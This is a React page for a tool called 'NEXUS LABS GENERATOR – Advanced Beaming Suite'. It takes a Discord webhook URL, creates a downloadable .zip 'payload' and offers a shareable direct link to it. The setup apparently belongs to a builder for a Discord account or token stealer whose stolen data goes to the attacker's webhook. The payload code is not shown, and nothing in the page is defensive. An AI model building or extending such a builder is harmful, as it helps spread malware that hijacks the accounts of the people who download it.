import { useState } from "react";
import { Link } from "wouter";
import { useForm } from "react-hook-form";
import { zodResolver } from "@hookform/resolvers/zod";
import { z } from "zod";
import { motion } from "framer-motion";
import { Copy, Skull, CheckCircle2, ShieldAlert, BookOpen, Terminal, Download, LayoutGrid } from "lucide-react";
import { useCreatePrank } from "@/hooks/use-pranks";
import { NeonButton } from "@/components/NeonButton";
import { GlitchText } from "@/components/GlitchText";
import { useToast } from "@/hooks/use-toast";

const formSchema = z.object({
  webhookUrl: z.string().url("Must be a valid URL").startsWith("https://discord.com/api/webhooks/", "Must be a Discord Webhook"),
});

type FormValues = z.infer<typeof formSchema>;

export default function Home() {
  const [generatedLink, setGeneratedLink] = useState<string | null>(null);
  const { toast } = useToast();
  const createPrank = useCreatePrank();
  
  const form = useForm<FormValues>({
    resolver: zodResolver(formSchema),
    defaultValues: {
      webhookUrl: "",
    },
  });

  const onSubmit = async (data: FormValues) => {
    try {
      const prank = await createPrank.mutateAsync({
        webhookUrl: data.webhookUrl
      });
      setGeneratedLink(prank.id.toString());
      toast({ title: "Link gerado com sucesso!" });
    } catch (err) {
      toast({ 
        title: "Erro", 
        description: err instanceof Error ? err.message : "Falha ao gerar link",
        variant: "destructive" 
      });
    }
  };

  const handleDownload = () => {
    if (generatedLink) {
      window.location.href = `/api/pranks/${generatedLink}/download`;
    }
  };

  return (
    <div className="min-h-screen flex flex-col items-center justify-center p-4 relative overflow-hidden bg-black text-green-500 font-mono scanlines">
      <div className="absolute top-10 right-10 z-50 flex gap-4">
        <Link href="/dashboard">
          <button className="p-3 bg-card/80 border-2 border-purple-500/50 rounded-full hover:bg-purple-500/20 transition-all shadow-[0_0_20px_rgba(168,85,247,0.3)] group">
            <LayoutGrid className="w-6 h-6 text-purple-500 group-hover:scale-110 transition-transform" />
          </button>
        </Link>
        <Link href="/tutorials">
          <button className="p-3 bg-card/80 border-2 border-secondary/50 rounded-full hover:bg-secondary/20 transition-all shadow-[0_0_20px_rgba(34,197,94,0.3)] group">
            <BookOpen className="w-6 h-6 text-secondary group-hover:scale-110 transition-transform" />
          </button>
        </Link>
        <Link href="/admin">
          <button className="p-3 bg-card/80 border-2 border-primary/50 rounded-full hover:bg-primary/20 transition-all shadow-[0_0_20px_rgba(168,85,247,0.3)] group">
            <ShieldAlert className="w-6 h-6 text-primary group-hover:scale-110 transition-transform" />
          </button>
        </Link>
      </div>

      {/* Background Decor */}
      <div className="fixed inset-0 opacity-10 pointer-events-none" 
           style={{ backgroundImage: 'linear-gradient(0deg, transparent 24%, rgba(34, 197, 94, .3) 25%, rgba(34, 197, 94, .3) 26%, transparent 27%, transparent 74%, rgba(34, 197, 94, .3) 75%, rgba(34, 197, 94, .3) 76%, transparent 77%, transparent), linear-gradient(90deg, transparent 24%, rgba(34, 197, 94, .3) 25%, rgba(34, 197, 94, .3) 26%, transparent 27%, transparent 74%, rgba(34, 197, 94, .3) 75%, rgba(34, 197, 94, .3) 76%, transparent 77%, transparent)', backgroundSize: '50px 50px' }} 
      />
      
      <motion.div
        initial={{ opacity: 0, y: 30 }}
        animate={{ opacity: 1, y: 0 }}
        transition={{ duration: 0.8, ease: "easeOut" }}
        className="max-w-xl w-full relative z-10"
      >
        <div className="text-center mb-12 space-y-4">
          <div className="flex justify-center mb-6">
            <div className="p-4 rounded-full border-2 border-green-500 bg-black/50 backdrop-blur shadow-[0_0_30px_rgba(34,197,94,0.3)]">
              <Skull className="w-12 h-12 text-green-500" />
            </div>
          </div>
          <GlitchText text="NEXUS LABS GENERATOR" className="text-4xl md:text-5xl font-black text-green-500 text-glow" />
          <p className="text-green-500/60 font-mono italic">
            Advanced Beaming Suite
          </p>
        </div>

        {!generatedLink ? (
          <div className="bg-black/80 backdrop-blur-md border border-green-500/30 p-8 rounded-lg shadow-[0_0_50px_rgba(34,197,94,0.15)] relative overflow-hidden group">
            <div className="absolute inset-0 bg-gradient-to-r from-transparent via-green-500/10 to-transparent translate-x-[-200%] group-hover:translate-x-[200%] transition-transform duration-[2s] pointer-events-none" />

              <div className="space-y-6 relative z-10">
                <div className="space-y-2">
                  <label className="text-sm font-display text-green-500 uppercase tracking-wider flex items-center gap-2">
                    <Terminal className="w-4 h-4" /> Discord Webhook URL
                  </label>
                  <input
                    {...form.register("webhookUrl")}
                    placeholder="https://discord.com/api/webhooks/..."
                    className="w-full bg-green-900/10 border-2 border-green-500/30 rounded px-4 py-3 text-green-400 placeholder:text-green-500/20 focus:outline-none focus:border-green-500 focus:shadow-[0_0_15px_rgba(34,197,94,0.3)] transition-all font-mono"
                  />
                  {form.formState.errors.webhookUrl && (
                    <p className="text-red-500 text-xs font-mono mt-1">
                      {form.formState.errors.webhookUrl.message}
                    </p>
                  )}
                </div>

                <NeonButton
                  type="button"
                  onClick={form.handleSubmit(onSubmit)}
                  variant="secondary"
                  className="w-full bg-green-500/10 border-green-500 text-green-500 hover:bg-green-500 hover:text-black"
                  isLoading={createPrank.isPending}
                >
                  GENERATE PAYLOAD
                </NeonButton>
              </div>
          </div>
        ) : (
          <motion.div
            initial={{ scale: 0.9, opacity: 0 }}
            animate={{ scale: 1, opacity: 1 }}
            className="bg-black/90 backdrop-blur-md border-2 border-green-500 p-8 rounded-lg shadow-[0_0_50px_rgba(34,197,94,0.4)] text-center space-y-6"
          >
            <div className="w-16 h-16 bg-green-500/20 rounded-full flex items-center justify-center mx-auto mb-4 border border-green-500 animate-pulse">
              <CheckCircle2 className="w-8 h-8 text-green-500" />
            </div>
            
            <h3 className="text-2xl font-display text-green-500 uppercase font-black">Payload Ready</h3>
            
            <div className="bg-black border border-green-500/30 p-4 rounded font-mono text-sm break-all text-green-400">
              {window.location.origin}/api/pranks/{generatedLink}/download
            </div>

            <div className="flex flex-col gap-4">
              <NeonButton onClick={() => {
                navigator.clipboard.writeText(`${window.location.origin}/api/pranks/${generatedLink}/download`);
                toast({ title: "Link de download copiado!" });
              }} variant="secondary" className="w-full bg-green-500/10 border-green-500 text-green-500 hover:bg-green-500 hover:text-black">
                <Copy className="w-4 h-4 mr-2 inline" /> COPIAR LINK DIRETO
              </NeonButton>
              <NeonButton onClick={handleDownload} variant="secondary" className="w-full bg-green-500/10 border-green-500 text-green-500 hover:bg-green-500 hover:text-black">
                <Download className="w-4 h-4 mr-2 inline" /> TESTAR DOWNLOAD (.ZIP)
              </NeonButton>
              <NeonButton onClick={() => setGeneratedLink(null)} variant="secondary" className="w-full text-xs text-green-500/40 hover:text-green-500 bg-transparent border-none">
                NEW PAYLOAD
              </NeonButton>
            </div>
          </motion.div>
        )}
      </motion.div>

      {/* Footer */}
      <div className="absolute bottom-4 left-0 right-0 text-center text-xs text-green-500/20 font-mono">
        SYSTEM_ID: {Math.random().toString(36).substring(7).toUpperCase()} // SECURE_CONNECTION_ESTABLISHED
      </div>
    </div>
  );
}
